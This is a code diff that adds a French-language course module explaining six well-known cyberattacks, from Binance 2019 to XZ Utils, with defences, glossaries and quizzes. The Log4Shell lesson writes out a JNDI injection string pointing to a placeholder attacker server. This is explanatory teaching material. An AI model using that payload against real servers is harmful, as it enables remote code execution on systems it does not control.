@@ -590,6 +590,134 @@
           }
         }
       ]
+    },
+    {
+      "id": "cyber",
+      "emoji": "🛡️",
+      "title": "Grandes cyberattaques expliquées",
+      "intro": "Six attaques célèbres, racontées simplement : ce qui s'est passé, comment les attaquants ont procédé, les conséquences et comment s'en protéger. Les nouvelles attaques sont expliquées chaque jour par l'agent analyste (/cyber dans le bot, page « Actus sécurité » du site).",
+      "lessons": [
+        {
+          "id": "c1",
+          "title": "Binance 2019 : 7 000 bitcoins en une transaction",
+          "content": "Ce qui s'est passé : en mai 2019, des pirates retirent 7 000 bitcoins (environ 40 millions de dollars à l'époque) du portefeuille chaud de Binance, en une seule transaction.\nComment : selon Binance, ils avaient accumulé pendant longtemps des informations de comptes d'utilisateurs — clés d'API, codes de double authentification (2FA) — par hameçonnage, virus et d'autres attaques, puis ils ont déclenché un gros retrait coordonné qui a échappé aux contrôles.\nConséquences : retraits suspendus environ une semaine ; Binance a couvert les pertes avec son fonds d'urgence SAFU.\nComment s'en protéger : côté utilisateur, des clés d'API sans droit de retrait et une liste blanche d'adresses ; côté plateforme, peu de fonds dans le portefeuille chaud, des limites de retrait et la détection des comportements anormaux.",
+          "example": "Un portefeuille chaud (hot wallet) est connecté à Internet pour payer vite ; un portefeuille froid (cold wallet) est hors ligne. Les vols massifs visent presque toujours le chaud… ou le processus qui alimente le froid.",
+          "terms": [
+            ["hot wallet", "portefeuille chaud (connecté)"],
+            ["API key", "clé d'API"],
+            ["withdrawal", "retrait"],
+            ["two-factor authentication", "double authentification"]
+          ],
+          "quiz": {
+            "question": "Pourquoi les plateformes gardent-elles peu de fonds dans le portefeuille chaud ?",
+            "options": ["Parce qu'il est connecté à Internet, donc plus exposé", "Parce qu'il est plus lent", "Parce qu'il coûte plus cher"],
+            "answer": 0,
+            "explain": "Ce qui est en ligne peut être atteint à distance : on y garde seulement le nécessaire."
+          }
+        },
+        {
+          "id": "c2",
+          "title": "Bybit 2025 : 1,5 milliard volé par une signature trompée",
+          "content": "Ce qui s'est passé : le 21 février 2025, environ 1,5 milliard de dollars d'Ether sont volés à la plateforme Bybit, le plus gros vol de cryptomonnaies connu à cette date. Le FBI l'attribue au groupe nord-coréen TraderTraitor (lié à Lazarus).\nComment : les attaquants compromettent l'ordinateur d'un développeur de Safe{Wallet}, le service multisignature utilisé par Bybit, et modifient le code JavaScript de son interface web. Les signataires de Bybit voient un transfert normal, mais signent en réalité une modification du contrat du portefeuille qui en donne le contrôle aux attaquants.\nConséquences : fonds vidés puis blanchis par des centaines d'adresses ; Bybit rembourse ses clients grâce à des prêts et à ses réserves.\nComment s'en protéger : vérifier ce que l'on signe sur un second appareil indépendant (éviter la « signature aveugle »), contrôler l'intégrité du code servi aux signataires, imposer un délai et des limites aux très grosses opérations.",
+          "example": "Plusieurs signatures (multisig) ne protègent pas si tous les signataires regardent le même écran piégé. Ce schéma — poste d'un ingénieur compromis, puis signatures détournées — revient dans l'actualité : voir /cyber.",
+          "terms": [
+            ["blind signing", "signature aveugle"],
+            ["multisig", "multisignature"],
+            ["supply chain", "chaîne d'approvisionnement"],
+            ["attribution", "attribution (désigner l'auteur)"]
+          ],
+          "quiz": {
+            "question": "Pourquoi la multisignature n'a-t-elle pas suffi chez Bybit ?",
+            "options": [
+              "Les signataires ont validé une transaction différente de celle affichée",
+              "Il n'y avait qu'un seul signataire",
+              "Les clés étaient écrites sur papier"
+            ],
+            "answer": 0,
+            "explain": "L'interface piégée affichait un transfert normal : chaque signataire a été trompé de la même façon."
+          }
+        },
+        {
+          "id": "c3",
+          "title": "SolarWinds 2020 : la mise à jour piégée",
+          "content": "Ce qui s'est passé : découverte en décembre 2020, une porte dérobée appelée SUNBURST se cachait dans des mises à jour officielles et signées du logiciel Orion de SolarWinds, utilisé pour surveiller les réseaux d'entreprises et d'administrations. Les États-Unis attribuent l'opération au renseignement extérieur russe (SVR, APT29).\nComment : les attaquants se sont introduits dans le système de construction (build) de SolarWinds et ont inséré leur code au moment de la compilation. Environ 18 000 clients ont installé la mise à jour ; les attaquants n'ont ensuite exploité qu'un petit nombre de cibles choisies (agences fédérales américaines, grandes entreprises).\nConséquences : espionnage pendant des mois ; découverte par l'entreprise FireEye (Mandiant), elle-même victime.\nComment s'en protéger : sécuriser la chaîne de construction (builds reproductibles, contrôles d'intégrité), surveiller le comportement même des logiciels « de confiance », segmenter le réseau, appliquer le moindre privilège.",
+          "example": "Une attaque de la chaîne d'approvisionnement : au lieu d'attaquer 18 000 victimes, on attaque leur fournisseur commun.",
+          "terms": [
+            ["supply chain attack", "attaque de la chaîne d'approvisionnement"],
+            ["backdoor", "porte dérobée"],
+            ["build system", "système de construction"],
+            ["signed update", "mise à jour signée"]
+          ],
+          "quiz": {
+            "question": "Pourquoi la signature numérique des mises à jour n'a-t-elle pas protégé les clients ?",
+            "options": [
+              "Le code malveillant a été ajouté avant la signature, pendant la construction",
+              "Les clients avaient désactivé les signatures",
+              "La signature était expirée"
+            ],
+            "answer": 0,
+            "explain": "Une signature prouve que le fichier vient de l'éditeur, pas qu'il est sain : le build lui-même était compromis."
+          }
+        },
+        {
+          "id": "c4",
+          "title": "Colonial Pipeline 2021 : un mot de passe, un oléoduc à l'arrêt",
+          "content": "Ce qui s'est passé : en mai 2021, le rançongiciel du groupe DarkSide frappe Colonial Pipeline, le principal oléoduc de carburant de la côte Est des États-Unis. L'entreprise arrête l'oléoduc par précaution pendant plusieurs jours, ce qui provoque des pénuries.\nComment : accès initial par un ancien compte VPN dont le mot de passe avait fuité, sans authentification multifacteur.\nConséquences : une rançon d'environ 75 bitcoins (≈ 4,4 millions de dollars) est payée ; le département de la Justice américain en récupère ensuite une partie.\nComment s'en protéger : MFA partout, suppression des comptes inutilisés, sauvegardes hors ligne testées, séparation entre le réseau informatique et le réseau industriel.",
+          "example": "La faille n'était pas technique mais d'hygiène : un compte oublié, un mot de passe réutilisé, pas de MFA.",
+          "terms": [
+            ["ransomware", "rançongiciel"],
+            ["initial access", "accès initial"],
+            ["multi-factor authentication", "authentification multifacteur"],
+            ["ransom", "rançon"]
+          ],
+          "quiz": {
+            "question": "Quelle mesure aurait le plus probablement bloqué l'accès initial ?",
+            "options": ["L'authentification multifacteur sur le VPN", "Un antivirus plus récent", "Un mot de passe plus long sur le Wi-Fi"],
+            "answer": 0,
+            "explain": "Même avec le mot de passe volé, un second facteur aurait empêché la connexion."
+          }
+        },
+        {
+          "id": "c5",
+          "title": "Log4Shell 2021 : un texte qui exécute du code",
+          "content": "Ce qui s'est passé : en décembre 2021 est révélée la faille CVE-2021-44228 (score CVSS maximal de 10) dans Log4j, une bibliothèque Java de journalisation présente dans d'innombrables logiciels.\nComment : il suffisait qu'une application enregistre dans ses journaux un texte contrôlé par l'attaquant, par exemple ${jndi:ldap://serveur-de-l-attaquant/a}. Log4j interprétait l'expression, allait chercher du code sur le serveur de l'attaquant et l'exécutait : exécution de code à distance.\nConséquences : exploitation massive en quelques heures (minage de cryptomonnaies, rançongiciels, espionnage) et des mois de correctifs.\nComment s'en protéger : connaître ses dépendances (inventaire, SBOM), corriger vite, ne jamais interpréter des données d'entrée comme des commandes, limiter les connexions sortantes des serveurs.",
+          "example": "Lien avec ton PFE : une entrée texte apparemment anodine qui change le comportement d'un système — c'est aussi l'idée des exemples adversariaux et des injections de prompt.",
+          "terms": [
+            ["remote code execution", "exécution de code à distance"],
+            ["logging", "journalisation"],
+            ["dependency", "dépendance"],
+            ["software bill of materials (SBOM)", "inventaire des composants logiciels"]
+          ],
+          "quiz": {
+            "question": "Qu'est-ce qui rendait Log4Shell si facile à exploiter ?",
+            "options": [
+              "Il suffisait de faire enregistrer un texte piégé dans les journaux",
+              "Il fallait un accès physique au serveur",
+              "Il fallait connaître le mot de passe administrateur"
+            ],
+            "answer": 0,
+            "explain": "N'importe quel champ journalisé (nom d'utilisateur, en-tête HTTP…) pouvait servir de point d'entrée."
+          }
+        },
+        {
+          "id": "c6",
+          "title": "XZ Utils 2024 : deux ans pour gagner la confiance",
+          "content": "Ce qui s'est passé : en mars 2024, une porte dérobée (CVE-2024-3094) est découverte dans les versions 5.6.0 et 5.6.1 de xz / liblzma, une bibliothèque de compression utilisée par de nombreuses distributions Linux.\nComment : un contributeur se faisant appeler « Jia Tan » gagne pendant environ deux ans la confiance du mainteneur, devient co-mainteneur, puis cache du code malveillant dans des fichiers de test et dans le script de construction des archives publiées. Sur certaines distributions, la bibliothèque se chargeait dans le serveur SSH et pouvait permettre à l'attaquant d'exécuter des commandes à distance.\nDécouverte : Andres Freund, ingénieur chez Microsoft, remarque que les connexions SSH sont un peu plus lentes et consomment plus de processeur ; l'alerte arrive avant que les versions piégées n'atteignent les versions stables de la plupart des distributions.\nComment s'en protéger : comparer les archives publiées au code du dépôt, builds reproductibles, soutenir les mainteneurs isolés, enquêter sur les anomalies de performance.",
+          "example": "Une attaque d'ingénierie sociale au long cours sur l'open source : la technique compte moins que la patience.",
+          "terms": [
+            ["maintainer", "mainteneur"],
+            ["social engineering", "ingénierie sociale"],
+            ["release tarball", "archive publiée"],
+            ["open source", "logiciel libre"]
+          ],
+          "quiz": {
+            "question": "Comment la porte dérobée de XZ a-t-elle été découverte ?",
+            "options": ["Un ingénieur a remarqué des connexions SSH anormalement lentes", "Un antivirus l'a signalée", "L'attaquant s'est dénoncé"],
+            "answer": 0,
+            "explain": "Une petite anomalie de performance, examinée avec curiosité, a évité une catastrophe."
+          }
+        }
+      ]
     }
   ],
   "redaction": [
